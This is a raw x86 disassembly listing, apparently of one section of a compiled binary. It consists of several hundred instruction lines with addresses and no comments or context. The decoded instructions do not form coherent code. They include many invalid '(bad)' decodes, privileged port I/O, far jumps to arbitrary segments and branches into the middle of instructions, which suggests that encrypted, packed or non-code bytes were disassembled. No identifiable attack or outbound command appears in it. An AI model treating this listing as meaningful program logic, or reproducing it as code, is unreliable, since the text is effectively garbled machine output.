  404813:	adc    BYTE PTR [eax],cl
  404815:	inc    esi
  404816:	cmp    ah,BYTE PTR [eax]
  404818:	sbb    eax,0xd0246fd5
  40481d:	fsubp  st(3),st
  40481f:	outs   dx,BYTE PTR ds:[esi]
  404820:	push   ecx
  404821:	mov    ah,al
  404823:	shl    BYTE PTR [eax],0x9c
  404826:	sti    
  404827:	ss push ecx
  404829:	sbb    cl,al
  40482b:	inc    ecx
  40482c:	cmp    al,0x6f
  40482e:	mov    al,ds:0x46b6f630
  404833:	jecxz  0x404854
  404835:	repnz lahf 
  404837:	sar    BYTE PTR [ecx-0x16],0x4d
  40483b:	(bad)  
  40483c:	mov    al,0xaf
  40483e:	xor    BYTE PTR [eax-0x58],bl
  404841:	mov    dh,0x47
  404843:	cs mov ebx,0xb5e12ad2
  404849:	ins    DWORD PTR es:[edi],dx
  40484a:	or     al,0x95
  40484c:	mov    fs,WORD PTR [esi+ebp*2+0x543b392c]
  404853:	mov    ds:0xe80c6cb1,al
  404858:	mov    ds:0x34dcf2ef,al
  40485d:	cwde   
  40485e:	ins    BYTE PTR es:[edi],dx
  40485f:	out    0x79,eax
  404861:	out    0xbf,al
  404863:	fisttp DWORD PTR ds:0x8f95a0ff
  404869:	loopne 0x40487b
  40486b:	in     eax,0x9e
  40486d:	lods   al,BYTE PTR ds:[esi]
  40486e:	cmc    
  40486f:	cmp    bh,bl
  404871:	ss adc dh,0x28
  404875:	adc    eax,0x2bd16946
  40487a:	push   edi
  40487b:	cdq    
  40487c:	out    dx,eax
  40487d:	hlt    
  40487e:	push   ss
  40487f:	imul   esi,DWORD PTR [edx],0x761e05ff
  404885:	(bad)  
  404886:	test   DWORD PTR [ecx+0x13bd6235],0xda6e0b43
  404890:	imul   edi,DWORD PTR [eax+0x371579c0],0x1b
  404897:	cmp    ebp,DWORD PTR [edi]
  404899:	inc    ebp
  40489a:	add    DWORD PTR [edi-0x1a],ecx
  40489d:	mov    ebp,DWORD PTR [edx-0xc]
  4048a0:	jbe    0x404906
  4048a2:	hlt    
  4048a3:	int3   
  4048a4:	jp     0x404914
  4048a6:	pop    esi
  4048a7:	jne    0x404879
  4048a9:	and    al,0x3e
  4048ab:	(bad)  [edx-0x30]
  4048ae:	sub    eax,0x23ef58c1
  4048b3:	shl    DWORD PTR [ecx-0x5060700b],1
  4048b9:	test   al,0x45
  4048bb:	mov    ecx,0xf939d7cc
  4048c0:	mov    dh,0xf5
  4048c2:	ss mov ch,0xdf
  4048c5:	jp     0x4048ac
  4048c7:	pushf  
  4048c8:	out    dx,eax
  4048c9:	test   DWORD PTR [ecx-0xd],ebx
  4048cc:	and    BYTE PTR [ebx],bl
  4048ce:	aaa    
  4048cf:	inc    ebx
  4048d0:	cmp    DWORD PTR [edi+0x7b1e0185],esi
  4048d6:	and    al,0xf
  4048d8:	aaa    
  4048d9:	shr    DWORD PTR [eax+0x2a],1
  4048dc:	neg    ah
  4048de:	xor    BYTE PTR [eax+0x7a],bl
  4048e1:	call   0x8378:0x3755fcd6
  4048e8:	cmp    DWORD PTR [edi-0x17],ecx
  4048eb:	inc    edx
  4048ec:	add    DWORD PTR [edi+0x1b3d614e],0xffffffeb
  4048f3:	push   edi
  4048f4:	sbb    eax,0x34a385e5
  4048f9:	(bad)  
  4048fa:	fsubr  QWORD PTR [edx+0x675d46fb]
  404900:	cld    
  404901:	pop    ebx
  404902:	sub    al,BYTE PTR [eax-0x1c]
  404905:	adc    BYTE PTR [edx+0x4a1fb8c0],bl
  40490b:	jmp    0x1f12d212
  404910:	loope  0x40497f
  404912:	rcr    bh,1
  404914:	scas   eax,DWORD PTR es:[edi]
  404915:	pop    ecx
  404916:	sub    eax,0x7a973782
  40491b:	fidiv  WORD PTR [ebp-0x6f]
  40491e:	cdq    
  40491f:	or     al,0xda
  404921:	imul   esi,DWORD PTR [ebp-0x3d],0x4e3cc00a
  404928:	fs inc edi
  40492a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40492b:	adc    eax,DWORD PTR [edx+0x19]
  40492e:	adc    dh,BYTE PTR [ebx+0x37b7c237]
  404934:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404935:	mov    eax,0xe1dc04ea
  40493a:	call   0x7de5c537
  40493f:	addr16 mov al,ds:0x1b0f
  404943:	add    BYTE PTR [ecx+0x42],bh
  404946:	xor    ebx,eax
  404948:	outs   dx,BYTE PTR ds:[esi]
  404949:	pop    edi
  40494a:	(bad)  
  40494b:	mov    ebp,0x7078fa0e
  404950:	out    0xd7,al
  404952:	out    0xa3,eax
  404954:	int3   
  404955:	lods   al,BYTE PTR ds:[esi]
  404956:	sub    eax,0xec525bd1
  40495b:	bswap  edi
  40495d:	xchg   ebp,eax
  40495e:	in     eax,dx
  40495f:	mov    ecx,0xfb56b89
  404964:	(bad)  
  404965:	stc    
  404966:	int    0xcb
  404968:	fcomp  DWORD PTR [eax+0xc]
  40496b:	cmp    dh,BYTE PTR [ebx+0x72]
  40496e:	xchg   edx,eax
  40496f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404970:	sub    BYTE PTR [edi],dl
  404972:	cmp    eax,0x32431683
  404977:	test   eax,0x1ba1f76c
  40497c:	cmp    ebx,DWORD PTR [ecx-0x27]
  40497f:	je     0x4049cf
  404981:	mov    ah,0xb3
  404983:	popf   
  404984:	call   0x32ad:0x653be9e7
  40498b:	loope  0x4049c4
  40498d:	repnz int3 
  40498f:	hlt    
  404990:	dec    cl
  404992:	or     DWORD PTR ss:[edi+0x30],ecx
  404996:	aas    
  404997:	aam    0x31
  404999:	popf   
  40499a:	(bad)  
  40499b:	fstp   TBYTE PTR [esi]
  40499d:	addr16 ds xchg edi,eax
  4049a0:	out    dx,eax
  4049a1:	imul   edx,DWORD PTR [eax+0x40f31c94],0xfffffff2
  4049a8:	inc    eax
  4049a9:	mov    ebx,DWORD PTR [esp+edx*1]
  4049ac:	call   0xf4aae193
  4049b1:	mov    eax,0xa412d120
  4049b6:	idiv   DWORD PTR [esi+0x60]
  4049b9:	xlat   BYTE PTR ds:[ebx]
  4049ba:	xchg   edx,eax
  4049bb:	es and eax,0xa7f5e38
  4049c1:	add    esp,DWORD PTR [ebp-0x3053c436]
  4049c7:	cli    
  4049c8:	xchg   esi,eax
  4049c9:	and    eax,0x94642f3d
  4049ce:	jmp    0xb362:0x5379
  4049d4:	mov    dl,0x17
  4049d6:	int    0xb7
  4049d8:	inc    ecx
  4049d9:	pop    ebx
  4049da:	xor    edi,DWORD PTR [ecx]
  4049dc:	dec    esi
  4049dd:	add    al,0xb2
  4049df:	pop    ss
  4049e0:	cs hlt 
  4049e2:	cmp    BYTE PTR [ebp+0x35],dl
  4049e5:	mov    edi,0xfa96141
  4049ea:	mov    ecx,0x964b64c5
  4049ef:	cmp    ebp,DWORD PTR ds:0xacb136d4
  4049f5:	xchg   esi,eax
  4049f6:	push   ds
  4049f7:	dec    edx
  4049f8:	xchg   ecx,eax
  4049f9:	clc    
  4049fa:	jp     0x4049e9
  4049fc:	cld    
  4049fd:	stos   BYTE PTR es:[edi],al
  4049fe:	clc    
  4049ff:	sbb    bl,BYTE PTR [ebp-0x13]
  404a02:	push   edx
  404a03:	std    
  404a04:	mov    esi,0x52f9f8b8
  404a09:	(bad)  [eax-0x5f]
  404a0c:	pusha  
  404a0d:	out    0xb0,al
  404a0f:	fwait
  404a10:	in     al,0xda
  404a12:	cmp    ebp,DWORD PTR [edx-0x7f5c8d78]
  404a18:	push   esi
  404a19:	pop    ebp
  404a1a:	jg     0x404a3c
  404a1c:	int3   
  404a1d:	daa    
  404a1e:	test   BYTE PTR [ebx],bl
  404a20:	pop    ss
  404a21:	pop    ebx
  404a22:	fld    TBYTE PTR [edi-0x7f]
  404a25:	inc    eax
  404a26:	(bad)  
  404a27:	dec    ebp
  404a28:	mov    ch,0x94
  404a2a:	sahf   
  404a2b:	mov    ds:0x8a1dac02,eax
  404a30:	push   ecx
  404a31:	mov    ch,0x18
  404a33:	dec    edx
  404a34:	inc    esp
  404a35:	(bad)
  404a38:	out    dx,al
  404a39:	scas   al,BYTE PTR es:[edi]
  404a3a:	je     0x404a1c
  404a3c:	(bad)  
  404a3d:	jns    0x404a5e
  404a3f:	shl    BYTE PTR [ecx-0x67d36a9d],0xcd
  404a46:	mov    DWORD PTR [ebx],eax
  404a48:	outs   dx,DWORD PTR ds:[esi]
  404a49:	dec    edi
  404a4a:	mov    eax,0x3f31ceff
  404a4f:	jg     0x404a7a
  404a51:	idiv   BYTE PTR [esi+0x252eb67c]
  404a57:	or     BYTE PTR [ecx-0x59995448],0x9c
  404a5e:	pusha  
  404a5f:	rcr    BYTE PTR [ebp+0x67],cl
  404a62:	add    BYTE PTR [ecx],al
  404a64:	rol    ch,cl
  404a66:	cmc    
  404a67:	jbe    0x404a25
  404a69:	fwait
  404a6a:	mov    bl,0x1b
  404a6c:	ins    DWORD PTR es:[edi],dx
  404a6d:	mov    edi,0x79453178
  404a72:	icebp  
  404a73:	xchg   ebp,eax
  404a74:	xchg   ebp,eax
  404a75:	arpl   WORD PTR [edx-0x673d06fe],dx
  404a7b:	repnz mov ah,BYTE PTR [edx]
  404a7e:	lods   al,BYTE PTR ds:[esi]
  404a7f:	jns    0x404a6f
  404a81:	xchg   esi,eax
  404a82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a83:	mov    dl,0xb3
  404a85:	idiv   DWORD PTR [ebp+0x4]
  404a88:	cwde   
  404a89:	retf   0x3a77
  404a8c:	cs push esi
  404a8e:	popf   
  404a8f:	push   0xffffff80
  404a91:	fwait
  404a92:	(bad)  
  404a93:	push   edx
  404a94:	mov    ebp,0xa514ec2e
  404a99:	push   0x365ce33b
  404a9e:	outs   dx,BYTE PTR ds:[esi]
  404a9f:	sar    BYTE PTR [edi+0x615b3cbd],0x0
  404aa6:	shl    BYTE PTR [eax+0x3cbecec2],0x90
  404aad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404aae:	pop    ebp
  404aaf:	xor    eax,0xafaa8009
  404ab4:	push   0xe3a32760
  404ab9:	or     ah,BYTE PTR [ebp+0x4b]
  404abc:	test   eax,0xb0168361
  404ac1:	jnp    0x404adb
  404ac3:	or     DWORD PTR [eax],edi
  404ac5:	ret    0x3773
  404ac8:	rol    BYTE PTR [esi],1
  404aca:	or     al,0x37
  404acc:	cmp    DWORD PTR [edx],0x81eed3a6
  404ad2:	sahf   
  404ad3:	xlat   BYTE PTR ds:[ebx]
  404ad4:	push   edi
  404ad5:	sbb    DWORD PTR [esi-0x19],edi
  404ad8:	fimul  WORD PTR [edx+0x1b2df5d9]
  404ade:	cmc    
  404adf:	les    ebx,FWORD PTR [ebx-0x466fec77]
  404ae5:	mov    edx,0x640b0b2c
  404aea:	jnp    0x404b42
  404aec:	lea    ebx,[ebx]
  404aee:	mov    esp,0xab64130d
  404af3:	mov    al,0xab
  404af5:	xor    eax,0x9fee6ead
  404afa:	sbb    esp,edx
  404afc:	scas   eax,DWORD PTR es:[edi]
  404afd:	jp     0x404ab4
  404aff:	ins    DWORD PTR es:[edi],dx
  404b00:	or     BYTE PTR [edx-0x43890b2e],0x7e
  404b07:	push   ss
  404b08:	mov    ah,0x5f
  404b0a:	loopne 0x404ae3
  404b0c:	sahf   
  404b0d:	pminub mm6,QWORD PTR [ebx]
  404b10:	(bad)  
  404b11:	mov    es,ebp
  404b13:	xchg   edi,eax
  404b14:	outs   dx,DWORD PTR ds:[esi]
  404b15:	lods   al,BYTE PTR ds:[esi]
  404b16:	dec    eax
  404b17:	mov    ds:0x480fdfb5,eax
  404b1c:	pop    ebp
  404b1e:	mov    bh,0x2b
  404b20:	leave  
  404b21:	add    dl,BYTE PTR [esi]
  404b23:	jns    0x404b64
  404b25:	sahf   
  404b26:	pop    eax
  404b27:	ficomp WORD PTR ds:0xd596609c
  404b2d:	mov    eax,0xa7df188f
  404b32:	or     edi,DWORD PTR [edi]
  404b34:	cmp    al,0xc2
  404b36:	adc    BYTE PTR [edi+0xf4761bc],0xbb
  404b3d:	mov    ebp,es
  404b3f:	jmp    0x404b3d
  404b41:	test   eax,0xf219a340
  404b46:	pop    ebx
  404b47:	push   ecx
  404b48:	push   edx
  404b49:	cmp    dh,BYTE PTR [eax+eiz*2-0x1]
  404b4d:	inc    ebx
  404b4e:	pop    ds
  404b4f:	jno    0x404ad7
  404b51:	shr    edx,1
  404b53:	sbb    eax,0xd6c46fa6
  404b58:	les    ecx,FWORD PTR [ebx-0x13]
  404b5b:	jmp    0xe09cb94a
  404b60:	cmp    bl,BYTE PTR [eax-0x62141b11]
  404b66:	xor    ecx,DWORD PTR [edi+0x6a]
  404b69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b6a:	sub    esp,0x19d31cae
  404b70:	push   edx
  404b71:	repz ds out 0x2b,eax
  404b75:	push   ebx
  404b76:	cld    
  404b77:	shl    DWORD PTR [esp+edi*8+0x1ee0441d],cl
  404b7e:	mov    cs,WORD PTR [esi+0x52]
  404b81:	dec    ebx
  404b82:	pop    ebx
  404b83:	mov    DWORD PTR [ebx+edx*2+0x696a5e66],ebx
  404b8a:	in     eax,dx
  404b8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b8c:	sbb    eax,ecx
  404b8e:	mov    bh,0x3
  404b90:	sub    bl,BYTE PTR [ecx]
  404b92:	sahf   
  404b93:	repz stc 
  404b95:	cmp    BYTE PTR [ebp+0x3fd62548],bh
  404b9b:	aaa    
  404b9c:	loop   0x404c1d
  404b9e:	or     DWORD PTR [eax+0x713c2187],esp
  404ba4:	jno    0x404bef
  404ba6:	push   es
  404ba7:	jmp    0xb25d:0xdcf6bdb
  404bae:	xlat   BYTE PTR ds:[ebx]
  404baf:	mov    eax,0xff6972f1
  404bb4:	push   0xffffffb6
  404bb6:	cmp    esp,DWORD PTR [edx]
  404bb8:	sbb    eax,0xd0590f54
  404bbd:	xor    ah,BYTE PTR [esi+ecx*1-0x18e4f6d6]
  404bc4:	push   eax
  404bc5:	adc    DWORD PTR [edi-0x2aa4adde],eax
  404bcb:	push   esi
  404bcc:	bound  eax,QWORD PTR [edi-0x1c]
  404bcf:	jne    0x404bcd
  404bd1:	cmc    
  404bd2:	push   edi
  404bd3:	pop    eax
  404bd4:	(bad)  [eax]
  404bd6:	cmp    DWORD PTR [eax+0x35b2a683],ebx
  404bdc:	(bad)  
  404bdd:	fld    TBYTE PTR [ecx-0x15f5167f]
  404be3:	(bad)  
  404be4:	and    BYTE PTR [edx+0x2cd1d864],dh
  404bea:	dec    edx
  404beb:	inc    ebx
  404bec:	dec    esi
  404bed:	in     al,dx
  404bee:	fadd   DWORD PTR [eax+0x62]
  404bf1:	es pop ebp
  404bf3:	sbb    eax,0x2dc6b954
  404bf8:	in     eax,0x2a
  404bfa:	or     eax,0xbc4f577b
  404bff:	fwait
  404c00:	or     dh,cl
  404c02:	and    BYTE PTR [eax-0x74],0xfe
  404c06:	adc    BYTE PTR [ebx],dh
  404c08:	je     0x404b8e
  404c0a:	cmp    BYTE PTR [ecx],dh
  404c0c:	push   edx
  404c0d:	sbb    eax,DWORD PTR [esi]
  404c0f:	xchg   esi,eax
  404c10:	push   es
  404c11:	sbb    ch,ah
  404c13:	xor    al,0x89
  404c15:	jl     0x404c6c
  404c17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c18:	push   cs
  404c19:	jle    0x404c89
  404c1b:	push   0xffffffd1
  404c1d:	inc    edi
  404c1e:	pushf  
  404c1f:	sub    BYTE PTR [eax],dh
  404c21:	pop    es
  404c22:	in     al,dx
  404c23:	mov    al,0x4
  404c25:	xchg   ecx,eax
  404c26:	push   ds
  404c27:	arpl   WORD PTR [edi],bp
  404c29:	(bad)
  404c2c:	and    ecx,ebp
  404c2e:	push   cs
  404c2f:	(bad)  
  404c30:	xlat   BYTE PTR ds:[ebx]
  404c31:	sbb    bh,BYTE PTR [esi-0x48edaffe]
  404c37:	frstor [edx+0x5b]
  404c3a:	add    edi,DWORD PTR [eax]
  404c3c:	xchg   ebx,eax
  404c3d:	dec    ebp
  404c3e:	mov    ebp,0xb7b1295b
  404c43:	xchg   ebp,eax
  404c44:	(bad)  
  404c45:	push   edi
  404c46:	sbb    eax,0x8eb770f5
  404c4b:	pop    ecx
  404c4c:	ret    
  404c4d:	std    
  404c4e:	xor    eax,0x9b1a0f1c
  404c53:	and    dh,BYTE PTR [esi-0x7c]
  404c56:	leave  
  404c57:	and    al,BYTE PTR [eax]
  404c59:	pop    eax
  404c5a:	cs jmp 0x7f7c6503
  404c60:	xchg   esp,eax
  404c61:	xchg   ebp,eax
  404c62:	jp     0x404ce2
  404c64:	leave  
  404c65:	jo     0x404bf4
  404c67:	push   ds
  404c68:	dec    esp
  404c69:	xlat   BYTE PTR ds:[ebx]
  404c6a:	add    cl,BYTE PTR [esp+ebp*8+0x4b]
  404c6e:	push   es
  404c6f:	add    dh,dh
  404c71:	jmp    0x594e4ea5
  404c76:	std    
  404c77:	jmp    0x404c98
  404c79:	rcr    DWORD PTR [edi-0x12],0x7d
  404c7d:	repz je 0x404c78
  404c80:	pop    edi
  404c81:	ss pop esi
  404c83:	ret    0x33e0
  404c86:	call   0x7070:0xce74b0b2
  404c8d:	call   0x8f1d:0x56d7e1bc
  404c94:	push   0x680aa70b
  404c99:	dec    DWORD PTR [ebx+0x70983734]
  404c9f:	fs sub al,0x36
  404ca2:	adc    dl,BYTE PTR [ecx]
  404ca4:	and    al,0xa2
  404ca6:	neg    DWORD PTR [edi-0x4e]
  404ca9:	inc    esp
  404caa:	xor    DWORD PTR ds:0xf3958654,esp
  404cb0:	sti    
  404cb1:	cli    
  404cb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cb3:	fwait
  404cb4:	or     eax,0xcbc8642f
  404cb9:	ds stos BYTE PTR es:[edi],al
  404cbb:	pop    esi
  404cbc:	sar    eax,0x5c
  404cbf:	xlat   BYTE PTR ds:[ebx]
  404cc0:	cli    
  404cc1:	lods   al,BYTE PTR ds:[esi]
  404cc2:	jl     0x404c6c
  404cc4:	inc    eax
  404cc5:	inc    ebp
  404cc6:	push   ds
  404cc7:	(bad)  
  404cc8:	mov    bl,0xe
  404cca:	cmp    al,BYTE PTR [ebx+esi*2-0x33]
  404cce:	leave  
  404ccf:	mov    cs,WORD PTR [edx]
  404cd1:	stos   DWORD PTR es:[edi],eax
  404cd2:	in     eax,dx
  404cd3:	sbb    eax,0xb2e69e0c
  404cd8:	cli    
  404cd9:	out    0xb7,eax
  404cdb:	adc    BYTE PTR [esi],bh
  404cdd:	pop    eax
  404cde:	call   0x7e1db25c
  404ce3:	sub    BYTE PTR [eax],0x75
  404ce6:	popa   
  404ce7:	rcl    BYTE PTR [ecx-0x3294c9b9],cl
  404ced:	call   0x592f:0x7dab8f66
  404cf4:	(bad)  
  404cf5:	retf   
  404cf6:	fst    QWORD PTR [eax]
  404cf8:	inc    esp
  404cf9:	mov    bl,0x51
  404cfb:	mov    cl,0x66
  404cfd:	in     eax,dx
  404cfe:	fs test eax,0x4681375c
  404d04:	jne    0x404cf4
  404d06:	adc    al,0xfd
  404d08:	push   cs
  404d09:	pop    es
  404d0a:	out    dx,al
  404d0b:	out    0x6,eax
  404d0d:	push   0xffffff99
  404d0f:	or     ecx,DWORD PTR [ecx]
  404d11:	(bad)  
  404d12:	sub    eax,0x9e4a82d3
  404d17:	sahf   
  404d18:	push   ss
  404d19:	sbb    BYTE PTR [ebx],ch
  404d1b:	pminub mm2,QWORD PTR [ebp-0x70]
  404d1f:	fsincos 
  404d21:	ja     0x404cba
  404d23:	leave  
  404d24:	mov    cl,0x1e
  404d26:	std    
  404d27:	adc    al,0x42
  404d29:	aam    0x21
  404d2b:	iret   
  404d2c:	out    0x12,al
  404d2e:	inc    ebx
  404d2f:	fs jnp 0x404cb7
  404d32:	cwde   
  404d33:	push   es
  404d34:	xlat   BYTE PTR ds:[ebx]
  404d35:	sbb    eax,ebp
  404d37:	dec    ebx
  404d38:	push   0xfffffff2
  404d3a:	fs push ebx
  404d3c:	pop    ebp
  404d3d:	inc    edx
  404d3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d3f:	mov    bl,0x80
  404d41:	test   ecx,0x79acbe9f
  404d47:	sub    al,0x8
  404d49:	mov    ds:0xe90ad3c4,al
  404d4e:	jb     0x404d1c
  404d50:	pop    es
  404d51:	inc    eax
  404d52:	test   DWORD PTR [edi+0x6f],0xf2db8989
  404d59:	mov    eax,ds:0xda5f60b4
  404d5e:	jg     0x404dd8
  404d60:	rcl    BYTE PTR [ecx],cl
  404d62:	call   0xc67b:0x992eebc3
  404d69:	bound  ebx,QWORD PTR [edi-0x73]
  404d6c:	lock mov eax,0x53754b44
  404d72:	jb     0x404db8
  404d74:	test   BYTE PTR [eax],al
  404d76:	icebp  
  404d77:	pop    es
  404d78:	gs push ds
  404d7a:	xchg   edx,eax
  404d7b:	shl    BYTE PTR [ebx+0x43b30253],0x14
  404d82:	sub    DWORD PTR [eax],edx
  404d84:	stc    
  404d85:	jne    0x404d85
  404d87:	mov    eax,ds:0x855855a8
  404d8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d8d:	sti    
  404d8e:	mov    esi,0xea7d8ec0
  404d93:	daa    
  404d94:	cmp    bl,ah
  404d96:	mov    BYTE PTR [edi-0x41],ch
  404d99:	cmp    edx,ebx
  404d9b:	cmp    edi,DWORD PTR [edi+0x5a734828]
  404da1:	aad    0xd
  404da3:	push   0xfffffffe
  404da5:	out    0xf,al
  404da7:	inc    ebx
  404da8:	inc    edi
  404da9:	cmp    DWORD PTR [edx+0x7476849f],edi
  404daf:	into   
  404db0:	test   cl,0x14
  404db3:	xchg   al,cl
  404db5:	sbb    edi,DWORD PTR [eax+edx*2+0x9]
  404db9:	push   ss
  404dba:	pop    ds
  404dbb:	inc    esp
  404dbc:	in     eax,0xb0
  404dbe:	or     al,dl
  404dc0:	jmp    0xb5c1:0xd68ef4d
  404dc7:	push   edx
  404dc8:	pop    esi
  404dc9:	xor    eax,0x69e43958
  404dce:	mov    eax,ds:0xe27e7293
  404dd3:	pop    ebx
  404dd4:	pop    ebx
  404dd5:	mov    bl,0x49
  404dd7:	stc    
  404dd8:	add    al,bl
  404dda:	pop    edx
  404ddb:	test   eax,0x482b73d3
  404de0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404de1:	cmp    DWORD PTR [ebx+0x53],esp
  404de4:	add    al,0x23
  404de6:	xor    edi,DWORD PTR [eax+0x3a]
  404de9:	cmp    bl,BYTE PTR [esi+eax*8]
  404dec:	inc    edi
  404ded:	into   
  404dee:	sbb    al,0x40
  404df0:	(bad)  
  404df1:	jge    0x404dcf
  404df3:	mov    bh,0xf3
  404df5:	mov    ds,WORD PTR [eax+0x203c8fab]
  404dfb:	pop    es
  404dfc:	imul   esi,DWORD PTR [ebx+ebx*4],0x2de6cdad
  404e03:	pop    esi
  404e04:	mov    ebx,esp
  404e06:	popa   
  404e07:	in     eax,0x2d
  404e09:	addr16 je 0x404e8a
  404e0c:	cwde   
  404e0d:	lds    ecx,FWORD PTR [ebp-0x31bc298a]
  404e13:	aad    0x47
  404e15:	mul    dh
  404e17:	rol    BYTE PTR [edi+0x2c804a8],0x60
  404e1e:	lock jnp 0x404e93
  404e21:	les    ebx,FWORD PTR [ecx+0x7d]
  404e24:	rcl    DWORD PTR [esi],1
  404e26:	sub    sp,WORD PTR [eax+0x33878e5c]
  404e2d:	ror    BYTE PTR [ebx-0x7ac637b7],cl
  404e33:	fidiv  DWORD PTR ds:0x3a77e154
  404e39:	cdq    
  404e3a:	stc    
  404e3b:	and    esp,DWORD PTR [ecx]
  404e3d:	mov    bh,0x74
  404e3f:	mov    dl,BYTE PTR [eax-0x2c]
  404e42:	jae    0x404ddf
  404e44:	(bad)  
  404e45:	pop    eax
  404e46:	adc    BYTE PTR [ebx+0x4684371f],bh
  404e4c:	jae    0x404e7d
  404e4e:	pop    edi
  404e4f:	rcl    DWORD PTR [esi+0x5b3f9812],1
  404e55:	imul   edx,DWORD PTR [ebx],0x16
  404e58:	sbb    dh,al
  404e5a:	sbb    BYTE PTR [ebp-0x14],ch
  404e5d:	aaa    
  404e5e:	push   0x244fbe14
  404e63:	mov    ?,WORD PTR [ebp+eiz*4-0x6a]
  404e67:	data16 scas al,BYTE PTR es:[edi]
  404e69:	push   cs
  404e6a:	int    0xc5
  404e6c:	mov    esi,0x8ca78d7e
  404e71:	push   bp
  404e73:	sub    BYTE PTR [edx-0x3dcfd1b1],cl
  404e79:	mov    ebx,0xae81dfcd
  404e7e:	inc    ecx
  404e7f:	pop    ds
  404e80:	fst    QWORD PTR [ebp+eax*4+0x3a]
  404e84:	aam    0xf9
  404e86:	mov    cs,ebx
  404e88:	sub    BYTE PTR [edx+0x43ee916a],bh
  404e8e:	push   edi
  404e8f:	mov    esp,0xfeee8bd7
  404e94:	in     eax,dx
  404e95:	in     eax,dx
  404e96:	popf   
  404e97:	gs mov ebp,gs
  404e9a:	pop    esp
  404e9b:	pop    edi
  404e9c:	mov    cs,WORD PTR [esi+0x48]
  404e9f:	xchg   esp,eax
  404ea0:	jle    0x404eeb
  404ea2:	cmp    DWORD PTR [eax-0x4127a6ec],ebx
  404ea8:	and    al,BYTE PTR [ecx-0xc]
  404eab:	retf   0x203d
  404eae:	in     eax,0x7d
  404eb0:	or     ah,BYTE PTR [esi]
  404eb2:	cmc    
  404eb3:	cmc    
  404eb4:	or     ah,BYTE PTR [edx+0x6380a85a]
  404eba:	sub    bh,dh
  404ebc:	aad    0x89
  404ebe:	jmp    0xb61705f9
  404ec3:	out    dx,al
  404ec4:	shl    BYTE PTR [edi],0x24
  404ec7:	in     eax,dx
  404ec8:	dec    edx
  404ec9:	lods   eax,DWORD PTR ds:[esi]
  404eca:	mov    al,ds:0xa4517b54
  404ecf:	aaa    
  404ed0:	loop   0x404ebc
  404ed2:	pop    es
  404ed3:	lahf   
  404ed4:	jo     0x404ea1
  404ed6:	fs add ch,0xf0
  404eda:	shl    DWORD PTR [esi-0x312845d6],cl
  404ee0:	dec    edi
  404ee1:	inc    edi
  404ee2:	and    esp,ebx
  404ee4:	lods   al,BYTE PTR ds:[esi]
  404ee5:	sbb    DWORD PTR [edi-0x2c80390a],esi
  404eeb:	mov    DWORD PTR [eax],0xf7242154
  404ef1:	xchg   edx,eax
  404ef2:	js     0x404eac
  404ef4:	xchg   DWORD PTR [esi],esp
  404ef6:	push   0x1e2b9d7e
  404efb:	test   DWORD PTR [esi],0x407c77c0
  404f01:	xchg   esp,eax
  404f02:	cmp    BYTE PTR [esi],cl
  404f04:	xchg   edi,eax
  404f05:	and    al,0x60
  404f08:	inc    edi
  404f09:	jns    0x404f61
  404f0b:	jle    0x404f54
  404f0d:	sbb    al,cl
  404f0f:	jae    0x404f84
  404f11:	and    ch,BYTE PTR [ebp-0x49]
  404f14:	sbb    BYTE PTR [ebp-0x2ad23865],cl
  404f1a:	(bad)  
  404f1b:	mov    cl,0x50
  404f1d:	mov    edx,0xe8c24c96
  404f22:	outs   dx,BYTE PTR ds:[esi]
  404f23:	push   esp
  404f24:	add    BYTE PTR fs:[edx],0x8c
  404f28:	xchg   DWORD PTR [edx-0x1],ebp
  404f2b:	sbb    ax,WORD PTR [edi-0x4e]
  404f2f:	jae    0x404f1b
  404f31:	cmp    bl,BYTE PTR [ebx]
  404f33:	jbe    0x404f28
  404f35:	hlt    
  404f36:	sub    DWORD PTR [ebx],0x56
  404f39:	sub    BYTE PTR [esi],cl
  404f3b:	jns    0x404f51
  404f3d:	jno    0x404fab
  404f3f:	ret    0x4584
  404f42:	cdq    
  404f43:	jp     0x404f03
  404f45:	sbb    edx,ebx
  404f47:	out    0xff,eax
  404f49:	fcom   DWORD PTR [ebx]
  404f4b:	jmp    0x9711:0xa8c240b4
  404f52:	iret   
  404f53:	lds    ebp,FWORD PTR [ebp+0x2f]
  404f56:	lods   al,BYTE PTR ds:[esi]
  404f57:	mov    bh,0x5b
  404f59:	fdivr  QWORD PTR [esi+0x1c0b90e6]
  404f5f:	xchg   esi,eax
  404f60:	mov    bl,0x12
  404f62:	scas   al,BYTE PTR es:[edi]
  404f63:	sbb    al,0x43
  404f65:	inc    esp
  404f66:	sti    
  404f67:	mov    al,0x33
  404f69:	mov    ebp,0xdb5eb81f
  404f6e:	jg     0x404fc3
  404f70:	push   esp
  404f71:	cmp    edx,DWORD PTR [ebx]
  404f73:	(bad)  
  404f75:	outs   dx,BYTE PTR ds:[esi]
  404f76:	fnstenv [ebx+0x533cf0aa]
  404f7c:	cmp    al,0xf0
  404f7e:	push   eax
  404f7f:	mov    WORD PTR ds:0x6771ab99,fs
  404f85:	pushf  
  404f86:	loope  0x404f80
  404f88:	and    DWORD PTR [edx+0x3cfa61b6],edx
  404f8e:	out    dx,al
  404f8f:	sar    BYTE PTR [ecx],0x5c
  404f92:	mov    bl,0x99
  404f94:	dec    esp
  404f95:	jge    0x40500c
  404f97:	mov    ch,0x40
  404f99:	pop    edx
  404f9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f9b:	cld    
  404f9c:	scas   al,BYTE PTR es:[edi]
  404f9d:	jmp    0xdcbe2a1
  404fa2:	xor    ebp,DWORD PTR [ebp-0x2d293de6]
  404fa8:	sub    DWORD PTR [esp+ecx*8+0x383663bc],edi
  404faf:	pop    edx
  404fb0:	xor    al,0xf0
  404fb2:	push   ebx
  404fb3:	xchg   esp,eax
  404fb4:	or     al,0x2a
  404fb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404fb7:	xor    dh,ah
